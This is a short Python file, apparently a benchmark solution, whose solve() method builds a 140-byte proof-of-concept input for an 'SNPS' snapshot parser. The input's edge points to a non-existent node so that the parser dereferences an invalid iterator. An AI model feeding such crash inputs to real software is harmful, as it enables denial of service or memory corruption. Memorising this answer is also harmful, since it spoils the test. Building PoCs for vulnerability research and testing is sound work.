import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        poc = bytearray()

        # Header (8 bytes): Magic number "SNPS" and version 1
        poc.extend(b"SNPS")
        poc.extend(struct.pack('<I', 1))

        # Counts (16 bytes): 1 node and 1 edge, as 64-bit unsigned integers
        poc.extend(struct.pack('<Q', 1))  # node_count
        poc.extend(struct.pack('<Q', 1))  # edge_count

        # Node Data (64 bytes)
        # Define a single node with ID 1.
        node_payload = struct.pack(
            '<IIQQ',
            1,    # type
            0,    # name_index
            1,    # id
            128   # size
        )
        poc.extend(node_payload)
        poc.extend(b'\x00' * (64 - len(node_payload)))  # Pad to 64 bytes

        # Edge Data (52 bytes)
        # Define an edge from the existing node (ID 1) to a non-existent
        # node (ID 2). This triggers the vulnerability when the parser
        # attempts to look up and dereference an iterator to node 2.
        edge_payload = struct.pack(
            '<IIQQ',
            0,    # type
            0,    # name_index
            1,    # from_node_id
            2     # to_node_id (non-existent)
        )
        poc.extend(edge_payload)
        poc.extend(b'\x00' * (52 - len(edge_payload)))  # Pad to 52 bytes

        # Total length: 8 + 16 + 64 + 52 = 140 bytes
        return bytes(poc)